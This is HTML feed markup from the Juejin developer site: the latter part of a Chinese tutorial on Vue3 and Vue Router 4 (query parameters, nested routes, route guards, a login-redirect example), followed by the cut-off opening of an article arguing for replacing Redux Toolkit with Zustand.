<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">goToSearch</span> = (<span class="hljs-params"/>) =&gt; {
  router.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/search'</span>,
    <span class="hljs-attr">query</span>: { <span class="hljs-attr">keyword</span>: <span class="hljs-string">'vue3'</span>, <span class="hljs-attr">page</span>: <span class="hljs-number">1</span> }
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h5 data-id="heading-17">步骤 2：接收查询参数</h5>
<p>接收方式和动态路由参数类似，通过 <code>route.query</code> 获取：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/views/Search.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"search"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>搜索页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>搜索关键词：{{ route.query.keyword }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>当前页码：{{ route.query.page }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(route.<span class="hljs-property">query</span>) <span class="hljs-comment">// 输出：{ keyword: 'vue3', page: '1' }</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h5 data-id="heading-18">两种参数的区别（重点）</h5>


























<table><thead><tr><th>参数类型</th><th>URL 显示</th><th>是否需要配置路由</th><th>页面刷新后是否保留</th><th>适用场景</th></tr></thead><tbody><tr><td>动态路由参数</td><td>/user/123（嵌入路径）</td><td>是（需配置 :id）</td><td>是</td><td>必填参数（详情页 ID）</td></tr><tr><td>查询参数</td><td>/search?keyword=vue3（拼接在路径后）</td><td>否</td><td>是</td><td>可选参数（筛选、搜索）</td></tr></tbody></table>
<h3 data-id="heading-19">五、进阶用法：嵌套路由、路由守卫</h3>
<p>掌握基础用法后，我们来看两个开发中高频使用的进阶技巧：嵌套路由和路由守卫。</p>
<h4 data-id="heading-20">1. 嵌套路由（多级路由）</h4>
<p>嵌套路由用于实现页面的多级导航（比如首页下有“推荐”“热门”两个子页面），核心是在父路由中添加 <code>children</code>数组，配置子路由规则。</p>
<h5 data-id="heading-21">示例：实现首页嵌套子路由</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/Home.vue'</span>),
    <span class="hljs-comment">// 子路由（嵌套路由）</span>
    <span class="hljs-attr">children</span>: [
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">''</span>, <span class="hljs-comment">// 子路由默认路径（访问 / 时，默认显示该子组件）</span>
        <span class="hljs-attr">name</span>: <span class="hljs-string">'HomeRecommend'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/HomeRecommend.vue'</span>)
      },
      {
        <span class="hljs-attr">path</span>: <span class="hljs-string">'hot'</span>, <span class="hljs-comment">// 子路由路径（完整路径：/hot）</span>
        <span class="hljs-attr">name</span>: <span class="hljs-string">'HomeHot'</span>,
        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/HomeHot.vue'</span>)
      }
    ]
  }
]
</code></pre>
<p>然后在父组件（Home.vue）中，添加 <code>&lt;router-view&gt;</code> 渲染子路由组件：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/views/Home.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"home"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>首页<span class="hljs-symbol">&amp;lt;</span>/h1<span class="hljs-symbol">&amp;gt;</span>
    <span class="hljs-comment">&lt;!-- 子路由导航 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"sub-nav"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/"</span>&gt;</span>推荐<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span> |
      <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/hot"</span>&gt;</span>热门<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span>
    <span class="hljs-symbol">&amp;lt;</span>/div<span class="hljs-symbol">&amp;gt;</span>
    <span class="hljs-comment">&lt;!-- 子路由视图：渲染子路由对应的组件 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</span></code></pre>
<p>此时访问 <code>/</code>，会显示 Home 组件 + HomeRecommend 组件；访问 <code>/hot</code>，会显示 Home 组件 + HomeHot 组件，实现多级导航。</p>
<h4 data-id="heading-22">2. 路由守卫（路由拦截）</h4>
<p>路由守卫用于在路由跳转前、跳转后执行一些逻辑（比如权限判断、页面埋点、取消请求），Vue Router 4 支持 3 种常用守卫：<strong>全局守卫</strong>、<strong>路由独享守卫</strong>、<strong>组件内守卫</strong>。</p>
<h5 data-id="heading-23">（1）全局守卫（影响所有路由）</h5>
<p>在路由配置文件中定义，适用于全局权限控制（比如未登录禁止访问个人中心）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({ ... })

<span class="hljs-comment">// 1. 全局前置守卫（跳转前执行，最常用）</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-comment">// to：即将跳转的路由信息</span>
  <span class="hljs-comment">// from：当前要离开的路由信息</span>
  <span class="hljs-comment">// next()：放行；next('/login')：强制跳转；next(false)：取消跳转</span>
  
  <span class="hljs-comment">// 示例：未登录禁止访问 /user</span>
  <span class="hljs-keyword">const</span> isLogin = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>) <span class="hljs-comment">// 模拟登录状态</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">path</span> === <span class="hljs-string">'/user'</span> &amp;&amp; !isLogin) {
    <span class="hljs-comment">// 未登录，强制跳转到登录页</span>
    <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>)
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 已登录，放行</span>
    <span class="hljs-title function_">next</span>()
  }
})

<span class="hljs-comment">// 2. 全局后置守卫（跳转后执行，用于埋点、修改页面标题）</span>
router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// 修改页面标题</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">name</span> || <span class="hljs-string">'Vue3 路由演示'</span>
  <span class="hljs-comment">// 页面埋点（示例）</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`跳转至：<span class="hljs-subst">${to.path}</span>`</span>)
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<h5 data-id="heading-24">（2）组件内守卫（影响当前组件）</h5>
<p>在组件内部定义，适用于当前组件的路由拦截（比如离开组件时提示保存），Vue3 组合式 API 中使用<code>onBeforeRouteEnter</code>、<code>onBeforeRouteLeave</code> 等钩子：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/views/Edit.vue（编辑页）</span>
&lt;script setup&gt;
<span class="hljs-keyword">import</span> { onBeforeRouteLeave } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-comment">// 组件内守卫：离开当前组件时执行</span>
<span class="hljs-title function_">onBeforeRouteLeave</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 示例：提示用户保存内容</span>
  <span class="hljs-keyword">const</span> isSave = <span class="hljs-title function_">confirm</span>(<span class="hljs-string">'内容未保存，确定要离开吗？'</span>)
  <span class="hljs-keyword">if</span> (isSave) {
    <span class="hljs-title function_">next</span>() <span class="hljs-comment">// 确认离开，放行</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">// 取消离开</span>
  }
})
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-25">六、实战案例：实现登录跳转+权限控制</h3>
<p>结合上面的知识点，我们实现一个常见的实战场景：未登录用户访问个人中心时，自动跳转到登录页，登录成功后跳转回个人中心。</p>
<h4 data-id="heading-26">1. 配置路由</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/router/index.js</span>
<span class="hljs-keyword">const</span> routes = [
  { <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>, <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/Home.vue'</span>) },
  { <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Login'</span>, <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/Login.vue'</span>) },
  { 
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user'</span>, 
    <span class="hljs-attr">name</span>: <span class="hljs-string">'User'</span>, 
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/User.vue'</span>),
    <span class="hljs-attr">meta</span>: { <span class="hljs-attr">requiresAuth</span>: <span class="hljs-literal">true</span> } <span class="hljs-comment">// 标记该路由需要登录权限</span>
  }
]

<span class="hljs-comment">// 全局前置守卫：权限控制</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-comment">// 判断当前路由是否需要登录</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span>) {
    <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'token'</span>)
    <span class="hljs-keyword">if</span> (token) {
      <span class="hljs-comment">// 已登录，放行</span>
      <span class="hljs-title function_">next</span>()
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 未登录，跳转到登录页，并记录当前路由（登录后跳转回来）</span>
      <span class="hljs-title function_">next</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'Login'</span>, <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: to.<span class="hljs-property">path</span> } })
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 不需要登录，放行</span>
    <span class="hljs-title function_">next</span>()
  }
})
</code></pre>
<h4 data-id="heading-27">2. 登录组件（Login.vue）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/views/Login.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>登录页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"login"</span>&gt;</span>模拟登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useRouter, useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 模拟登录：存储 token</span>
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'token'</span>, <span class="hljs-string">'vue3-router-demo-token'</span>)
  
  <span class="hljs-comment">// 获取登录前的跳转路径（如果有，就跳回去；没有就跳首页）</span>
  <span class="hljs-keyword">const</span> redirect = route.<span class="hljs-property">query</span>.<span class="hljs-property">redirect</span> || <span class="hljs-string">'/'</span>
  router.<span class="hljs-title function_">push</span>(redirect)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-28">3. 个人中心组件（User.vue）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// src/views/User.vue</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>个人中心<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"logout"</span>&gt;</span>退出登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()

<span class="hljs-keyword">const</span> <span class="hljs-title function_">logout</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 模拟退出：清除 token</span>
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'token'</span>)
  <span class="hljs-comment">// 跳转到登录页</span>
  router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>测试流程：访问 <code>/user</code> → 未登录，自动跳转到 <code>/login?redirect=/user</code> → 点击登录 → 跳回 <code>/user</code> → 点击退出登录 → 跳回 <code>/login</code>，完美实现权限控制！</p>
<h3 data-id="heading-29">七、避坑指南（新手必看）</h3>
<ol>
<li>Vue3 必须使用 Vue Router 4.x，不能使用 3.x 版本，否则会报错（版本不兼容）。</li>
<li>组合式 API 中，不要在 <code>&lt;script setup&gt;</code> 中使用 <code>this.$router</code>、<code>this.$route</code>，必须用<code>useRouter()</code>、<code>useRoute()</code> 钩子。</li>
<li>动态路由参数跳转时，用 <code>name</code>匹配路由，不要用 <code>path</code>（用 path 会导致 params 参数失效）。</li>
<li>路由懒加载时，组件路径不要写错（相对路径要正确，比如 <code>../views/Home.vue</code>，不要写成 <code>./views/Home.vue</code>）。</li>
<li>嵌套路由的子路由 <code>path</code> 不要加 <code>/</code>，否则会被当作根路由（比如子路由 path 写 <code>'hot'</code>，不要写 <code>'/hot'</code>）。</li>
<li>全局前置守卫中，必须调用 <code>next()</code>、<code>next('/xxx')</code> 或 <code>next(false)</code>，否则路由会卡住，无法跳转。</li>
</ol>
<h3 data-id="heading-30">八、总结</h3>
<p>Vue3 + Vue Router 4 的核心用法其实并不复杂，关键是掌握以下几点：</p>
<ul>
<li>基础配置：<code>createRouter()</code> 创建实例 → 挂载到 Vue 实例 → 用 <code>router-link</code> 和 <code>router-view</code> 实现跳转和渲染。</li>
<li>参数传递：动态路由参数（必填）和查询参数（可选），接收用<code>route.params</code> 和 <code>route.query</code>。</li>
<li>进阶技巧：嵌套路由用 <code>children</code> 配置，权限控制用全局前置守卫。</li>
<li>性能优化：路由懒加载按需加载组件，提升首屏速度。</li>
</ul>
<p>本文涵盖了 Vue3 路由的所有高频用法，从基础到实战，每一步都有清晰示例，新手可以跟着步骤一步步操作，很快就能上手。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年，我们终于不仅为了“少写代码”而放弃 Redux，更是为了性能]]></title>    <link>https://juejin.cn/post/7602901195154079796</link>    <guid>https://juejin.cn/post/7602901195154079796</guid>    <pubDate>2026-02-05T05:29:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602901195154079796" data-draft-id="7602929352716435456" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年，我们终于不仅为了“少写代码”而放弃 Redux，更是为了性能"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-02-05T05:29:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="404星球的猫"/> <meta itemprop="url" content="https://juejin.cn/user/193147068224126"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年，我们终于不仅为了“少写代码”而放弃 Redux，更是为了性能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/193147068224126/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    404星球的猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T05:29:32.000Z" title="Thu Feb 05 2026 05:29:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 引言：Redux 的黄昏</h2>
<p>在 2020 年，Redux Toolkit (RTK) 的出现挽救了 Redux 的口碑。它消除了 boilerplate，让 Redux 变得“能用”。</p>
<p>但在 2026 年的今天，当我们面对越来越复杂的交互和对性能的极致追求时，RTK 依然显得太重了。我们决定全面转向 Zustand，这不仅是为了少写代码，更是为了<strong>性能</strong>。</p>
<h2 data-id="heading-1">2. 核心差异：选择器机制的降维打击</h2>
<p>为什么说 Zustand 性能更好？这涉及到 React 渲染原理的根本差异。</p>
<h3 data-id="heading-2">2.1 上下文 (Context) 的陷阱</h3>
<p>Redux 依赖 React Context 传递 Store。虽然 <code>react-redux</code> 做了大量优化，但在大型应用中，Context Provider 的更新依然容易引发“瀑布式”的无效渲染检查。</p>
<h3 data-id="heading-3">2.2 Zustand 的外部存储</h3>
<p>Zustand 的 Store 存在于 React 组件树之外。它通过订阅模式 (Subscription) 精确通知组件。只有当组件 <code>useStore(selector)</code> 返回的值发生浅比较变化时，组件才会重绘。</p>
<p><strong>原理结论</strong>：Redux 是自上而下的广播，Zustand 是点对点的精准投送。</p>
<h2 data-id="heading-4">3. 数据说话：10倍的差距</h2>
<p>我们对一个包含 5000 个列表项的看板应用进行了重构对比：</p>
<ul>
<li>
<p><strong>Bundle Size (Gzip)</strong>: Redux Toolkit (12.4KB) vs Zustand (1.1KB)。Zustand 轻了 10 倍。</p>
</li>
<li>
<p><strong>Re-renders</strong>: 在高频拖拽场景下，Zustand 的无效渲染次数减少了 65%。</p>
</li>
<li>
<p><strong>Boilerplate</strong>: 定义一个简单的计数器，RTK 需要 创建 Slice、导出 Action、配置 Store；Zustand 只需要 4 行代码。</p>
</li>
</ul>
<h2 data-id="heading-5">4. 代码实战：从繁琐到极简</h2>
<h3 data-id="heading-6">Before: Redux Toolkit</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. Slice</span>
<span class="hljs-keyword">const</span> counterSlice = <span class="hljs-title function_">createSlice</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'counter'</span>,
  <span class="hljs-attr">initialState</span>: { <span class="hljs-attr">value</span>: <span class="hljs-number">0</span> },
  <span class="hljs-attr">reducers</span>: {
    <span class="hljs-attr">increment</span>: <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> { state.<span class="hljs-property">value</span> += <span class="hljs-number">1</span> }
  }
})
<span class="hljs-comment">// 2. Store</span>
<span class="hljs-keyword">const</span> store = <span class="hljs-title function_">configureStore</span>({ <span class="hljs-attr">reducer</span>: { <span class="hljs-attr">counter</span>: counterSlice.<span class="hljs-property">reducer</span> } })
<span class="hljs-comment">// 3. Component</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">counter</span>.<span class="hljs-property">value</span>)
<span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>()
<span class="hljs-comment">// call</span>
<span class="hljs-title function_">dispatch</span>(counterSlice.<span class="hljs-property">actions</span>.<span class="hljs-title function_">increment</span>())
</code></pre>
<h3 data-id="heading-7">After: Zustand</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. Store &amp; Hook (All in one)</span>
<span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">create</span>(<span class="hljs-function"><span class="hljs-params">set</span> =&gt;</span> ({
  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> ({ <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> }))
}))

<span class="hljs-comment">// 2. Component</span>
<span class="hljs-keyword">const</span> { count, increment } = <span class="hljs-title function_">useStore</span>()
</code></pre>
<p>Zustand 将 State 和 Actions 封装在一起，Hook 既是 Store 也是 Accessor。这种心智模型比 Redux 的 Flux 架构更加直观。</p>
<h2 data-id="heading-8">5. 迁移策略：和平共处</h2>
<p>一定要一把梭重构吗？不。</p>
<ul>
<li>
